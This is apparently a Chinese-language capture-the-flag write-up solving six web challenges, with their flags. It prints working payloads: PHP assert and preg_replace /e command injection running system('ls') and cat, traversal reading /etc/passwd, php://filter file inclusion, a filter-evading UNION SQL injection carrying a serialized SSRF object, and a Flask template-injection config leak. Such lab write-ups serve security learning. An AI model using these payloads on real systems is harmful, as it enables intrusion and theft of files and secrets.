## DifficultyThree

### simple_js

1. 弹出密码框，点击确定后查看网页源代码，发现了这样一段js代码：

   ```javascript
       function dechiffre(pass_enc){
           var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
           var tab  = pass_enc.split(',');//55,56,54,79,115,69,114,116,107,49,50
                   var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
                           k = j + (l) + (n=0);
                           n = tab2.length;
                           for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                   if(i == 5)break;}
                           for(i = (o=0); i < (k = j = n); i++ ){
                           o = tab[i-l];
                                   if(i > 5 && i < k-1)
                                           p += String.fromCharCode((o = tab2[i]));
                           }
           p += String.fromCharCode(tab2[17]);
           pass = p;return pass;
       }
       String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));

       h = window.prompt('Enter password');
       alert( dechiffre(h) );
   ```
2. 简化dechiffre()后：

   ```javascript
   function dechiffre() {
       var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
       var tab2 = pass.split(',');
       var i;
       var p = "";
       for (i = 0; i < tab2.length; i++) {
           p += String.fromCharCode(tab2[i]);
       }
       return p;
   }
   ```
3. dechiffre()作用是将pass数组转化为字符串，将下方可疑字符串输出，得到：//55,56,54,79,115,69,114,116,107,49,50

   转为ascall码后：

   ```python
   l = [55, 56, 54, 79, 115, 69, 114, 116, 107, 49, 50]
   for i in l:
       print(chr(i), end='')
   ```

flag{786OsErtk12}

### lottery

1. 下载附件，是网站源码。网站是玩大乐透，挣钱买flag。
2. 找到关键校验函数buy，有这样一个判断：`if($numbers[$i] == $win_numbers[$i])`
   我们通过json格式上传的七个数字就是numbers数组，可以利用php弱类型绕过，恰好json也支持布尔类型的数据，抓包，改包：

   ```
   {"action":"buy","numbers":[ture,ture,ture,ture,ture,ture,ture]}
   ```

cyberpeace{de7e051e92332af027caa251632e8667}

### mfw

1. 尝试访问robots.txt，无果，访问.git，源码泄露，接着访问第一个文件，COMMIT_EDITMSG文件：

```
I love PHP's typesafety!
```

2. 存在git泄露，使用githack工具下载网页源码，看到这样一段关键代码：

   ```php
   <?php

   if (isset($_GET['page'])) {
   	$page = $_GET['page'];
   } else {
   	$page = "home";
   }

   $file = "templates/" . $page . ".php";

   // I heard '..' is dangerous!
   assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

   // TODO: Make this look nice
   assert("file_exists('$file')") or die("That file doesn't exist!");

   ?>
   ```

   将传入的参数令strpos闭合即可绕过该处检测，exp：`'.system("ls").'`

   index.php templates index.php templates That file doesn't exist!
3. `page=%27.system("cat%20./templates/flag.php").%27`,看不到flag，但语句是没有问题的，查看页面源码代码，flag被加了注释

cyberpeace{c8ce75784ddde7025e079b7a808c4eeb}

### ics-05

1. 查看网页源代码，发现有两个与后端交互的参数，id，page，测试有无sql注入，sqlmap扫过发现没有，试了一下目录遍历，没想到：

   ```
   root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false
   ```
2. page参数有文件包含漏洞，直接读取index.php：`http://61.147.171.105:62844/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../var/www/html/index.php`

   解码后得到源代码

   ```php
   <?php
   error_reporting(0);

   @session_start();
   posix_setuid(1000);


   ?>
   <!DOCTYPE HTML>
   <html>

   <head>
       <meta charset="utf-8">
       <meta name="renderer" content="webkit">
       <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
       <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
       <link rel="stylesheet" href="layui/css/layui.css" media="all">
       <title>设备维护中心</title>
       <meta charset="utf-8">
   </head>

   <body>
       <ul class="layui-nav">
           <li class="layui-nav-item layui-this"><a href="?page=index">云平台设备维护中心</a></li>
       </ul>
       <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
           <legend>设备列表</legend>
       </fieldset>
       <table class="layui-hide" id="test"></table>
       <script type="text/html" id="switchTpl">
           <!-- 这里的 checked 的状态只是演示 -->
           <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
       </script>
       <script src="layui/layui.js" charset="utf-8"></script>
       <script>
       layui.use('table', function() {
           var table = layui.table,
               form = layui.form;

           table.render({
               elem: '#test',
               url: '/somrthing.json',
               cellMinWidth: 80,
               cols: [
                   [
                       { type: 'numbers' },
                        { type: 'checkbox' },
                        { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
                        { field: 'name', title: '设备名', templet: '#nameTpl' },
                        { field: 'area', title: '区域' },
                        { field: 'status', title: '维护状态', minWidth: 120, sort: true },
                        { field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true }
                   ]
               ],
               page: true
           });
       });
       </script>
       <script>
       layui.use('element', function() {
           var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
           //监听导航点击
           element.on('nav(demo)', function(elem) {
               //console.log(elem)
               layer.msg(elem.text());
           });
       });
       </script>

   <?php

   $page = $_GET[page];

   if (isset($page)) {



   if (ctype_alnum($page)) {
   ?>

       <br /><br /><br /><br />
       <div style="text-align:center">
           <p class="lead"><?php echo $page; die();?></p>
       <br /><br /><br /><br />

   <?php

   }else{

   ?>
           <br /><br /><br /><br />
           <div style="text-align:center">
               <p class="lead">
                   <?php

                   if (strpos($page, 'input') > 0) {
                       die();
                   }

                   if (strpos($page, 'ta:text') > 0) {
                       die();
                   }

                   if (strpos($page, 'text') > 0) {
                       die();
                   }

                   if ($page === 'index.php') {
                       die('Ok');
                   }
                       include($page);
                       die();
                   ?>
           </p>
           <br /><br /><br /><br />

   <?php
   }}


   //方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

   if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

       echo "<br >Welcome My Admin ! <br >";

       $pattern = $_GET[pat];
       $replacement = $_GET[rep];
       $subject = $_GET[sub];

       if (isset($pattern) && isset($replacement) && isset($subject)) {
           preg_replace($pattern, $replacement, $subject);
       }else{
           die();
       }

   }





   ?>

   </body>

   </html>

   ```
3. 根据提示查看最后一部分开发人员测试代码：搜索 `subject`中匹配 `pattern`的部分，   以 `replacement`进行替换，传入的参数如果是php代码会先执行在匹配正则表达式替换
4. 添加X-Forwarded-For为127.0.0.1，传递参数，`pat=/(.*)/e&rep=system('cmd')&sub=aa`，打到执行任意命令的目的
   当传递的参数有空格时会报错，使用${IFS}空格变量即可
5. 查找，flag在s3chahahaDir/flag下，`pat=/(.*)/e&rep=system(%27cat${IFS}s3chahahaDir/flag/flag.php%27)&sub=aa`

cyberpeace{3b32ef39a4ff840f5ce00b92b70d47c0}

### fakebook

1. 查看robots.txt，发现文件index.php.bak，下载，目录爆破发现flag.php
2. 查看index.php页面，注册一个帐号后，点击admin，跳转到http://61.147.171.105:58327/view.php?no=1，把1改成2，报错，继续判断，
   页面有四个内容，order by 4,正常，order by 5，Unknown column '5' in 'order clause'，存在sql注入
3. no=-1 union select 1,2,3,4#，被过滤了，单独一个select不被过滤，单独一个union不被过滤，union select就会被过滤，如果只是简单匹配union，一个空格，select，多加几个空格61.147.171.105:58327/view.php?no=-1%20union%20%20%20%20%20select%201,2,3,4
   2出现在了屏幕中，其他位置则报反序列化错误
4. 先依据这个不需要但序列化的字段查询数据库结构，得到了一堆信息，没什么用，返回头来看index.php.bak文件，function get($url)会读取上传的url的页面内容，存在明显的ssrf漏洞，利用ssrf来读取目录爆破发现的flag.php即可, 可以先刷新一下环境重新注册，也可以直接在blog处写上序列化的字符串

   ```php
   $obj=new UserInfo("hehe",18,"file:///var/www/html/flag.php");
   //O:8:"UserInfo":3:{s:4:"name";s:4:"hehe";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
   //61.147.171.105:58327/view.php?no=-1%20union%20%20%20%20%20select%201,2,3,%27O:8:"UserInfo":3:{s:4:"name";s:4:"hehe";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}%27
   ```

flag{c1e552fdf77049fabf65168f22f7aeab}

### shrine

1. 打开直接就是网页运行的代码，明显的FLASK模板，注意有无FLASK模板注入漏洞，/shrine/与shrine函数绑定，{{1+1}}，2
2. 小括号被过滤，app.config['FLAG'] = os.environ.pop('FLAG')，app.config['FLAG']为flag，尝试不用小括号的payload
3. `globals:A reference to the dictionary that holds the function’s global variables — the global namespace of the module in which the function was defined`，保留了被定义的全局变量，get_flashed_messages下的 `__globals__`方法获取全局变量列表，`get_flashed_messages.__globals__['current_app'].config['FLAG']`查看flag

flag{shrine_is_good_ssti}
